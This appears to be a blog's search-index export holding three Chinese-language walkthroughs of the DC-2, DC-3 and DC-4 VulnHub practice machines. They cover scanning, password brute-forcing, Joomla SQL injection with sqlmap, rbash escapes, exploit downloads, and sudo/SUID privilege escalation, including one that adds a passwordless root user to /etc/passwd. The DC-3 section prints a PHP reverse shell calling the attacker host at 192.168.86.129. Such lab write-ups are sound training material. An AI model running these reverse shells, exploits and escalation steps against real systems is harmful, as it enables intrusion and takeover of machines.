<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DC-4</title>
    <link href="/2023/09/07/DC-4/"/>
    <url>/2023/09/07/DC-4/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-4靶场渗透"><a href="#DC-4靶场渗透" class="headerlink" title="DC-4靶场渗透"></a>DC-4靶场渗透</h1><p>扫描ip和端口，通过弱口令登陆后发现网页有命令执行，nc反弹shell后拿到交互式shell，下面记提权过程</p><p>查看具有root用户权限的SUID文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="1.png" alt="1"></p><h2 id="方法一：exim4-提权"><a href="#方法一：exim4-提权" class="headerlink" title="方法一：exim4 提权"></a>方法一：exim4 提权</h2><h3 id="1-exim简介"><a href="#1-exim简介" class="headerlink" title="1.exim简介"></a>1.exim简介</h3><p>Exim是一个MTA（Mail Transfer  Agent，邮件传输代理）服务器软件，该软件基于GPL协议开发，是一款开源软件。该软件主要运行于类UNIX系统。通常该软件会与Dovecot或Courier等软件搭配使用。Exim同时也是“进出口”（Export-Import）的英文缩写。</p><h3 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h3><p>查看exim4版本为4.89</p><p><img src="2.png" alt="2"></p><p>找msf，发现有4.89对应的exp，为了把exp扔到DC-4里，先用kali起一个http服务，把exp放上去，然后用DC-4的shell下载exp到DC-4上</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">systemctl start apache2.service     <span class="hljs-regexp">//</span>开启http服务<br>cp <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/linux/</span>local<span class="hljs-regexp">/46996.sh /</span>var<span class="hljs-regexp">/www/</span>html  <span class="hljs-regexp">//</span>把提权脚本放到网站上<br></code></pre></td></tr></table></figure><p>当前目录权限不够，换到&#x2F;tmp下载提权脚本</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/tmp</span><br>wget http:<span class="hljs-string">//192.168.86.129/46996.sh</span><br></code></pre></td></tr></table></figure><p><img src="3.png" alt="3"></p><p>下载好了，执行就行了，但是这里执行失败了</p><p><img src="4.png" alt="4"></p><p>发现没有执行权限，chmod +x赋予执行权限</p><p>然后执行脚本就行了</p><h2 id="方法二：teehee提权"><a href="#方法二：teehee提权" class="headerlink" title="方法二：teehee提权"></a>方法二：teehee提权</h2><h3 id="1-teehee简介"><a href="#1-teehee简介" class="headerlink" title="1.teehee简介"></a>1.teehee简介</h3><p>teehee是个小众的linux编辑器。如果有sudo权限，可以利用其来提权 </p><h3 id="2-提权-1"><a href="#2-提权-1" class="headerlink" title="2.提权"></a>2.提权</h3><p>看看系统里面有什么文件。在&#x2F;home下发现三个用户，但只有jim下有东西</p><p>&#x2F;home&#x2F;jim&#x2F;backups下看到一个old-passwords.bak文件，看名字应该是jim用户使用过的密码</p><p><img src="6.png" alt="6"></p><p>确实有一堆用过的密码，拿来当字典暴破一下，保存为1，hydra暴破</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hydra</span>  <span class="hljs-number">192.168.86.169</span> ssh -l jim -P ./<span class="hljs-number">1</span> -V -f<br></code></pre></td></tr></table></figure><p><img src="7.png" alt="7"></p><p>找到密码是jibril04，ssh登录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> jim@<span class="hljs-number">192.168.86.169</span><br></code></pre></td></tr></table></figure><p><code>sudo -l</code>看看能不能提权</p><p><img src="8.png" alt="8"></p><p>我们相信你已经收到了当地系统的常规讲座</p><p>管理员通常可以归结为以下三件事：</p><p>#1） 尊重他人的隐私。</p><p>#2） 打字前先想一想。</p><p>#3） 权力越大，责任越大。</p><p>而且没有不用密码的sudo命令</p><p>在&#x2F;var&#x2F;spool&#x2F;mail目录下发现一封名为jim的邮件</p><p><img src="9.png" alt="9"></p><p>嗨，Jim，<br>我今天下班要去度假，所以老板让我把密码给你，以防出问题。<br>密码为：^xHhA&amp;hvim0y<br>再见，<br>查尔斯</p><p>换用户</p><p><img src="10.png" alt="10"></p><p>找到一个不用密码的root权限执行的命令</p><p>teehee的帮助文档中发现：-a 参数可以追加文件，但不会覆盖，直接就想到了在passwd中加一个root权限的用户不就可以提权了。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&quot;hacker::0:0:::/bin/bash&quot;</span> | sudo teehee -a <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>然后切换用户就行了</p><p>最终找到flag</p><p><img src="5.png" alt="5"></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-3</title>
    <link href="/2023/09/06/DC-3/"/>
    <url>/2023/09/06/DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-3靶场渗透"><a href="#DC-3靶场渗透" class="headerlink" title="DC-3靶场渗透"></a>DC-3靶场渗透</h1><h2 id="0x01-靶场简介原文"><a href="#0x01-靶场简介原文" class="headerlink" title="0x01 靶场简介原文"></a>0x01 靶场简介原文</h2><p>DC-3是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>与以前的DC版本一样，这一个是为初学者设计的，尽管这一次，只有一个标志，一个入口点，根本没有线索。</p><p>Linux技能和熟悉Linux命令行是必须的，因为是一些基本的渗透测试工具的经验。</p><p>对于初学者，谷歌可以提供很大的帮助，但你可以随时在@DCAU7上向我发送推文，以获得帮助，让你再次前进。但请注意：我不会给予你答案，相反，我会给你一个关于如何前进的想法。</p><p>对于那些有CTF和Boot2Root挑战经验的人来说，这可能不会花你很长时间（事实上，它可能会花你不到20分钟）。</p><p>如果是这样的话，如果你想让它更有挑战性，你总是可以重做挑战，并探索其他获得root和获得标志的方法。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>本次环境为NAT下</p><p>攻击机为kali，IP：192.168.86.129</p><p>靶机<a href="https://www.five86.com/downloads/DC-3VM.zip">下载（VM版）</a></p><p>用vmware打开即可</p><h2 id="0x03-信息收集"><a href="#0x03-信息收集" class="headerlink" title="0x03 信息收集"></a>0x03 信息收集</h2><h3 id="1-寻找目标ip"><a href="#1-寻找目标ip" class="headerlink" title="1.寻找目标ip"></a>1.寻找目标ip</h3><p>老套路</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.86.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="1.png" alt="1"></p><p>dc-3的ip为192.168.86.167</p><h3 id="2-扫描开放端口"><a href="#2-扫描开放端口" class="headerlink" title="2.扫描开放端口"></a>2.扫描开放端口</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.86.167</span><br></code></pre></td></tr></table></figure><p><img src="2.png" alt="2"></p><p>80端口开放</p><h3 id="3-访问web页面"><a href="#3-访问web页面" class="headerlink" title="3.访问web页面"></a>3.访问web页面</h3><p><img src="3.png" alt="3"></p><p>这一次，只有一个flag，一个入口，没有任何线索。</p><p>要获得flag，显然必须获得root权限。</p><p>你如何获取root权限取决于你–当然，还有系统。</p><p>祝你好运–我希望你喜欢这个小挑战。 :-)</p><p>与此同时，发现网页的cms是Joomla</p><h3 id="4-后台扫描"><a href="#4-后台扫描" class="headerlink" title="4.后台扫描"></a>4.后台扫描</h3><p>用御剑扫一下后台</p><p><img src="4.png" alt="4"></p><p>只有第一个能正常访问，是登录页面</p><p><img src="5.png" alt="5"></p><h3 id="5-寻找漏洞"><a href="#5-寻找漏洞" class="headerlink" title="5.寻找漏洞"></a>5.寻找漏洞</h3><p>由于不知道Joomla版本，所以先用goby看看有漏洞没</p><p><img src="6.png" alt="6"></p><p>有sql注入漏洞</p><h2 id="0x04-利用漏洞"><a href="#0x04-利用漏洞" class="headerlink" title="0x04 利用漏洞"></a>0x04 利用漏洞</h2><p>既然有sql注入，就用sqlmap吧</p><p>sqlmap参数：</p><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>–level&#x3D;LEVEL</td><td>要执行的测试级别（1-5，默认为1，5级payload最多）</td></tr><tr><td>–risk&#x3D;RISK</td><td>执行测试的风险（1-3，默认值为1，3级最高危）</td></tr><tr><td>–random-agent</td><td>使用随机选择的HTTP U-A头</td></tr><tr><td>–dbs</td><td>查询所有库</td></tr></tbody></table><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.86.167/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=1,updatexml(0x23,concat(0x7c,substring(database(),1,10),0x7c),0x7c)&quot; --risk=3 --level=5 --dbs --random-agent -p list[fullordering]<br></code></pre></td></tr></table></figure><p><img src="7.png" alt="7"></p><p>找到五个库，根据刚刚goby给出的url，看一下现在用的库名</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://192.168.86.167/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=1,updatexml(0x23,concat(0x7e,database(),0x7e),0x7c)<br></code></pre></td></tr></table></figure><p><img src="8.png" alt="8"></p><p>库名是<code>joomladb</code>，看一下这个库里的表</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.86.167/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=1,updatexml(0x23,concat(0x7e,database(),0x7e),0x7c)&quot; -D &quot;joomladb&quot; --tables --risk=3 --level=5 --random-agent -p list[fullordering]<br></code></pre></td></tr></table></figure><p><img src="9.png" alt="9"></p><p>表挺多，但显然users表更重要一点</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.86.167/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=1,updatexml(0x23,concat(0x7e,database(),0x7e),0x7c)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns --risk=3 --level=5 --random-agent -p list[fullordering]<br></code></pre></td></tr></table></figure><p><img src="10.png" alt="10"></p><p>第一个位置选1或者直接回车都行，选2要指定字典路径</p><p>第二个箭头指定线程，这里用最大10线程</p><p>看到有name和password，查一下</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">sqlmap -u &quot;<span class="hljs-link">http://192.168.86.167/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="hljs-string">fullordering</span>]=1,updatexml(0x23,concat(0x7e,database(),0x7e),0x7c)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  --risk=3 --level=5 --random-agent -p list[fullordering]<br></code></pre></td></tr></table></figure><p><img src="11.png" alt="11"></p><p>就一个用户，是admin，但是密码是加密过的</p><p><img src="12.png" alt="12"></p><p>把密文写进password，用john解密，得到密码是snoopy</p><p>可以登陆后台了</p><p><img src="Blog\blo13.png" alt="13"></p><p>“最近的请求被拒绝，因为它包含无效的安全令牌。请刷新页面，然后重试。”</p><p>那重新登试试：<br><img src="14.png" alt="14"></p><p>啊这</p><p>搞了半天以为虚拟机有问题，结果是我的问题，直接访问extensions的上传文件的功能点就行了</p><p>在此路径下写一句话，保存</p><p><img src="15.png" alt="15"></p><p>这里有的教程直接给出了路径，不知道是猜的还是咋的，这里用另一种方法</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arcade">当系统没有禁用proc_popen的时候，我们是可以借助proc_popen轻松反弹这样的一个shell的。<br><span class="hljs-symbol">$soc</span>k = fsockopen(<span class="hljs-string">&quot;192.168.86.129&quot;</span>, <span class="hljs-string">&quot;5555&quot;</span>);<br><br><span class="hljs-symbol">$descriptorspec</span> = <span class="hljs-built_in">array</span>(<br><br>        <span class="hljs-number">0</span> =&gt; <span class="hljs-symbol">$soc</span>k,<br><br>        <span class="hljs-number">1</span> =&gt; <span class="hljs-symbol">$soc</span>k,<br><br>        <span class="hljs-number">2</span> =&gt; <span class="hljs-symbol">$soc</span>k<br><br>);<br><br><span class="hljs-symbol">$process</span> = proc_open(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-symbol">$descriptorspec</span>, <span class="hljs-symbol">$pipes</span>);<br><br>proc_close(<span class="hljs-symbol">$process</span>);<br><br></code></pre></td></tr></table></figure><p><img src="16.png" alt="16"></p><p>保存，访问index.php，同时kali监听5555端口</p><p><img src="sts%5CDC-3%5C17.png" alt="17"></p><p>拿到shell，看一下当前用户权限及系统版本</p><p><img src="18.png" alt="18"></p><p>上网搜一下，可以找到该系统为Ubuntu 16.04，看一下这个系统版本有没有漏洞</p><p><img src="19.png" alt="19"></p><p>39772.txt可以用于本次渗透，用已经拿到的shell把poc下载到靶机中</p><p>但是总是下载失败，两个思路，其一是下载到自己电脑上，然后用现成的shell，通过wget命令下载，另一种方法是再传一个一句话的shell，通过蚁剑上传上去，这里选后者</p><p>39772.txt中写着poc的地址，下载</p><p><img src="21.png" alt="21"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>tlab.com<span class="hljs-regexp">/exploit-database/</span>exploitdb-bin-sploits<span class="hljs-regexp">/-/</span>raw<span class="hljs-regexp">/main/</span>bin-sploits/<span class="hljs-number">39772</span>.zip<br></code></pre></td></tr></table></figure><p>下载之后直接传上去</p><p><img src="20.png" alt="20"></p><p>然后用拿到的shell解压缩</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">unzip 39772.<span class="hljs-keyword">zip</span>        <br><span class="hljs-keyword">cd</span> 39772               <br>tar -xvf exploit.tar    <br><span class="hljs-keyword">cd</span> ebpf_mapfd_doubleput_exploit<br></code></pre></td></tr></table></figure><p>看着有点费劲，获取交互式shell</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>上面箭头给出了用法，直接利用就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure><p>敲完命令稍等一下，就看到&#x2F;root下的flag了</p><p><img src="22.png" alt="22"></p><h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><p>1.<a href="https://zhuanlan.zhihu.com/p/476551838">DC-3的渗透测试</a></p><p>2.[DC-3靶场实战详解](<a href="https://www.freebuf.com/articles/web/320968.html">DC-3靶场实战详解 - FreeBuf网络安全行业门户</a>)</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-2</title>
    <link href="/2023/08/19/DC-2/"/>
    <url>/2023/08/19/DC-2/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-2靶场渗透"><a href="#DC-2靶场渗透" class="headerlink" title="DC-2靶场渗透"></a>DC-2靶场渗透</h1><h2 id="0x01-靶场简介原文"><a href="#0x01-靶场简介原文" class="headerlink" title="0x01 靶场简介原文"></a>0x01 靶场简介原文</h2><p>与DC-1非常相似，DC-2是另一个专门建造的易受攻击的实验室，目的是在渗透测试领域获得经验。</p><p>与最初的DC-1一样，它的设计考虑到了初学者。</p><p>Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。</p><p>就像DC-1一样，有五个标志，包括最后一个标志。</p><p>再一次，就像DC-1一样，标志对初学者很重要，但对有经验的人来说并不那么重要。</p><p>简而言之，唯一真正重要的标志是最终的标志。</p><p>对于初学者来说，谷歌是你的朋友。嗯，除了所有的隐私问题等。</p><p>我还没有探索实现root的所有方法，因为我废弃了我一直在研究的先前版本，除了基本操作系统安装之外，我完全从头开始。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>本次环境为NAT下</p><p>攻击机为kali，IP：192.168.86.129</p><p>靶机<a href="https://www.vulnhub.com/entry/dc-2,311/#top">下载官网</a></p><p>用vmware打开即可，会提示导入失败，点重试就行</p><h2 id="0x03-信息收集"><a href="#0x03-信息收集" class="headerlink" title="0x03 信息收集"></a>0x03 信息收集</h2><h3 id="1-找到目标IP"><a href="#1-找到目标IP" class="headerlink" title="1.找到目标IP"></a>1.找到目标IP</h3><p>kali下用nmap -sP找到本网段下存活主机</p><p><img src="1.png" alt="1"></p><p>.1是我的主机，.2是网关，.192是kali本身，.254是DHCP服务器，那就是192.168.86.166了，或者查看DC-2的mac地址，也能确定</p><h3 id="2-扫描开放端口"><a href="#2-扫描开放端口" class="headerlink" title="2.扫描开放端口"></a>2.扫描开放端口</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sS <span class="hljs-number">192.168.86.166</span><br></code></pre></td></tr></table></figure><p><img src="2.png" alt="2"></p><p>这里只开放了80端口，那就访问一下吧</p><h3 id="3-访问web页面"><a href="#3-访问web页面" class="headerlink" title="3.访问web页面"></a>3.访问web页面</h3><p>直接访问，访问会出错，想不通为什么</p><p><img src="3.png" alt="3"></p><p>看教程发现要改hosts，后来发现官方文档有过说明了</p><p><img src="4.png" alt="4"></p><p>发现flag：</p><p>你通常的单词表可能不起作用，所以，也许你只需要保持冷静。<br>密码越多越好，但有时你无法赢得所有密码。<br>以一个身份登录以查看下一个标志。<br>如果找不到，请以其他身份登录。</p><p>根据提示，我们需要使用cewl来抓取单词组成字典。cewl 简单来说，就是一款以爬虫模式在指定的URL上收集单词的工具，可以将它收到的单词组成一个字典，用来爆破使用。</p><h2 id="0x04-开渗"><a href="#0x04-开渗" class="headerlink" title="0x04 开渗"></a>0x04 开渗</h2><h3 id="1-初步思路"><a href="#1-初步思路" class="headerlink" title="1.初步思路"></a>1.初步思路</h3><p>首先要生产一个字典，而且要登录，那就搜集一下账户和密码，做个字典吧</p><h3 id="2-收集单词"><a href="#2-收集单词" class="headerlink" title="2.收集单词"></a>2.收集单词</h3><p>根据提示用cewl收集单词当密码本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cewl</span>  dc-<span class="hljs-number">2</span> &gt;password.txt<br></code></pre></td></tr></table></figure><h3 id="3-尝试登录"><a href="#3-尝试登录" class="headerlink" title="3.尝试登录"></a>3.尝试登录</h3><p>这里用到的工具是wpscan，这是一款专门针对wordpress的扫描工具，采用ruby语言编写，能够扫描worpress网站中包括主题漏洞、插件漏洞以及wordpress网站本身存在的漏洞。wpscan还可以扫描wordpress网站启用的插件和其他功能。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wpscan --url http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span> -e u -P password.txt   <span class="hljs-regexp">//</span>enum枚举<br></code></pre></td></tr></table></figure><p><code>-e u</code> 可以枚举出网站已经注册的用户名，并且wpscan可以枚举用户和暴破登录一起进行</p><p><code>-P</code>指定密码本</p><p><img src="6.png" alt="6"></p><p>找登录的后台：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="5.png" alt="5"></p><p>这里看到是&#x2F;wp-admin</p><h3 id="4-登录"><a href="#4-登录" class="headerlink" title="4.登录"></a>4.登录</h3><p>找到了有效的账号密码，看了一下tom，没什么东西，看看jerry</p><p><img src="7.png" alt="7"></p><p>找到flag2：<br>如果你找不到利用WordPress的捷径，还有别的方法，希望你可以找到另一个切入点</p><p>看了教程，用这个命令又扫了一遍nmap，试了一下masscan，只给出了端口的开放状态，没给出服务</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">p</span>- -<span class="hljs-selector-tag">A</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">86.166</span>  //-<span class="hljs-selector-tag">A</span>参数必不可少<br></code></pre></td></tr></table></figure><p>-A官方给的解释是：启用操作系统检测、版本检测、脚本扫描和traceroute</p><p><img src="8.png" alt="8"></p><p>如果不加-A，结果是这样的：</p><p><img src="9.png" alt="9"></p><p>发现7744端口有ssh，想用hydra爆破登录的话，搞一个放着用户名的txt方便一些，还是先生成一个用户名的文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wpscan --url http:<span class="hljs-regexp">//</span>dc-<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>找到三个用户名，写到user.txt里</p><p>用hydra登录：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hydra</span> -L user.txt -P password.txt <span class="hljs-number">192.168.86.166</span> ssh -s <span class="hljs-number">7744</span> <br></code></pre></td></tr></table></figure><p><img src="10.png" alt="10"></p><p>找到一个能登ssh的用户，登录看看</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -p <span class="hljs-number">7744</span> tom@<span class="hljs-number">192.168.86.166</span><br></code></pre></td></tr></table></figure><p>登陆进去后，找找flag3吧</p><p><img src="11.png" alt="11"></p><p>查看所有可用的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ·">compgen -c  <br></code></pre></td></tr></table></figure><p><img src="12.png" alt="12"></p><p>在最后发现了<code>vi</code>，可以用<code>vi</code>查看flag3的内容</p><p>“Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.”</p><p>“Tom总是追着Jerry。或许Tom应该为他感受到的压力而<code>su</code>”</p><p>提到了su和Jerry，su应该是提示我们提权，Jerry应该是提示去看看Jerry的目录</p><h4 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h4><p>既然要去jerry的家目录，就要换路径，但<code>cd </code>被限制了，不能用，此时要绕过rbash</p><p>rbash(Restricted bash，受限制的bash)，除此之外还有rksh和rsh</p><h5 id="1-BASH-CMDS绕过"><a href="#1-BASH-CMDS绕过" class="headerlink" title="1.BASH_CMDS绕过"></a>1.BASH_CMDS绕过</h5><p><img src="13.png" alt="13"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">BASH_CMDS[a]=<span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>然后再执行<code>a</code>就拿到了一个受限较小(可以执行<code>cd</code>命令但<code>cat</code>还是不能用)的shell。</p><h5 id="2-vi绕过"><a href="#2-vi绕过" class="headerlink" title="2.vi绕过"></a>2.vi绕过</h5><p>直接执行vi(后面跟不跟文件都行)，回车，写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ·">:set shell=/bin/bash  //这里shell这个名字不能改，是固定的<br></code></pre></td></tr></table></figure><p><img src="14.png" alt="14"></p><p>然后接着写入</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-symbol">:shell</span><br></code></pre></td></tr></table></figure><p><img src="15.png" alt="15"></p><p>还是不能用<code>cat</code>，倒是能换目录</p><h5 id="3-更多绕过方式"><a href="#3-更多绕过方式" class="headerlink" title="3.更多绕过方式"></a>3.更多绕过方式</h5><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">python3 -c &#x27;import <span class="hljs-keyword">os</span>;<span class="hljs-keyword">os</span>.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);&#x27;<br></code></pre></td></tr></table></figure><p>但靶机没有python，这个方法不适用此次渗透</p><p>更多方法见0x08</p><h2 id="0x05-绕过rbash后"><a href="#0x05-绕过rbash后" class="headerlink" title="0x05 绕过rbash后"></a>0x05 绕过rbash后</h2><p>现在可以换目录了，去jerry的目录里看看</p><p><img src="16.png" alt="16"></p><p>找到flag4：</p><p><img src="17.png" alt="17"></p><p>“很高兴看到你已经走了这么远，但你还没有回家。     &#x2F;&#x2F;这里应该是指&#x2F;root<br>你仍然需要得到最终的flag（唯一真正重要的flag！！）。<br>这里没有提示-你现在只能靠自己了。：-）<br>快离开这里！！！！”</p><p>因缺思厅</p><p>陷入思考</p><p>渗透的目的是什么？想到DC-1中提到的，必看三部曲，passwd，shadow，group，先看&#x2F;etc&#x2F;passwd：</p><p><img src="18.png" alt="18"></p><p>shadow没权限，都看完后，并没有什么收获，前面提到了<code>su</code>，应该看看root下面有没有好东西，结果没有权限访问</p><p>还是要提权</p><h2 id="0x06-Linux-环境变量和git提权"><a href="#0x06-Linux-环境变量和git提权" class="headerlink" title="0x06 Linux 环境变量和git提权"></a>0x06 Linux 环境变量和git提权</h2><p>添加环境变量</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(export) <span class="hljs-title class_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/usr/bin</span><br>(export) <span class="hljs-title class_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/bin</span><br></code></pre></td></tr></table></figure><p>到这里就能用sudo和su了，但是tom不能用sudo，要换jerry,换一下</p><p><img src="19.png" alt="19"></p><p>换好了，查看当前用户权限</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo -l</span><br></code></pre></td></tr></table></figure><p><img src="20.png" alt="20"></p><p>不需要密码可以执行git</p><p>下面将给出两种方法</p><p>(我们需要将shell的窗口变窄,使得回显信息不能一页显示)</p><p>1、在末行命令模式输入 sudo git help config<br>然后!&#x2F;bin&#x2F;bash 或 !’sh’ #完成提权<br>2、在末行命令模式输入sudo git -p help<br>输入!&#x2F;bin&#x2F;bash，即可打开一个用户为root的shell<br><img src="21.png" alt="21"></p><p><code>#</code>出现，游戏结束</p><p><img src="22.png" alt="22"></p><h2 id="0x07-反思"><a href="#0x07-反思" class="headerlink" title="0x07 反思"></a>0x07 反思</h2><p>做完整个靶场下来，思路有点混乱，主要是我太菜了[狗头]</p><p>看过关于环境变量的解释后，我做了一次实验，我不加环境变量，我指定<code>su</code>的绝对路径，是否可行？</p><p><strong>答案是肯定的：</strong></p><p><img src="666.png" alt="666"></p><p>所以前面环境变量只能说是方便我们渗透，并没有实现真正意义上的提权，也就算个绕过吧</p><p>ps：修改的环境变量只在当前用户生效</p><p>既然如此，我能不能直接一步到位，不绕过rbash？</p><p>我尝试了一下，如果不绕过rbash，后果是这样的：</p><p><img src="888.png" alt="888"></p><p>没有对PATH的写入权限，而且不能用<code>/</code>来指定绝对路径，所以还是很有必要的</p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p>1.<a 